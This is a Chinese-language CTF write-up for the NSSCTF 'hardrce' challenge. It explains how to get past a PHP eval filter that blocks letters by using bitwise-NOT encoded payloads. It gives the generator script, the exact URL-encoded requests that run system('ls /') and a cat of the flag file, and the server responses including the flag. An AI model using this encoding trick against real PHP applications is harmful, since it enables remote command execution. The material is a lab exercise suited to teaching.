# hardrce

题目链接：https://www.nssctf.cn/problem/439



解题思路：

该题目可以使用取反绕过。

```
<?php 
$s1 = "system";
$s2 = "ls /";
echo "(~".urlencode(~$s1).")"."(~".urlencode(~$s2).")";
?>
```

得到：

```
(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);
```

请求：

http://node5.anna.nssctf.cn:27801/?wllm=(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);

得到响应：

```
<?php
header("Content-Type:text/html;charset=utf-8");
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['wllm']))
{
    $wllm = $_GET['wllm'];
    $blacklist = [' ','\t','\r','\n','\+','\[','\^','\]','\"','\-','\$','\*','\?','\<','\>','\=','\`',];
    foreach ($blacklist as $blackitem)
    {
        if (preg_match('/' . $blackitem . '/m', $wllm)) {
        die("LTLT说不能用这些奇奇怪怪的符号哦！");
    }}
if(preg_match('/[a-zA-Z]/is',$wllm))
{
    die("Ra's Al Ghul说不能用字母哦！");
}
echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";
eval($wllm);
}
else
{
    echo "蔡总说：注意审题！！！";
}
?> NoVic4说：不错哦小伙子，可你能拿到flag吗？bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
```

再用：

```
<?php 
$s1 = "system";
$s2 = "cat /flllllaaaaaaggggggg";
echo "(~".urlencode(~$s1).")"."(~".urlencode(~$s2).");";
?>
```

得到：

```
(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);
```

请求：

```
http://node5.anna.nssctf.cn:27801/?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);
```

得到：

```
<?php
header("Content-Type:text/html;charset=utf-8");
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['wllm']))
{
    $wllm = $_GET['wllm'];
    $blacklist = [' ','\t','\r','\n','\+','\[','\^','\]','\"','\-','\$','\*','\?','\<','\>','\=','\`',];
    foreach ($blacklist as $blackitem)
    {
        if (preg_match('/' . $blackitem . '/m', $wllm)) {
        die("LTLT说不能用这些奇奇怪怪的符号哦！");
    }}
if(preg_match('/[a-zA-Z]/is',$wllm))
{
    die("Ra's Al Ghul说不能用字母哦！");
}
echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";
eval($wllm);
}
else
{
    echo "蔡总说：注意审题！！！";
}
?> NoVic4说：不错哦小伙子，可你能拿到flag吗？NSSCTF{7a1108b1-bcb2-4bee-888c-c57264b38d9b}
```

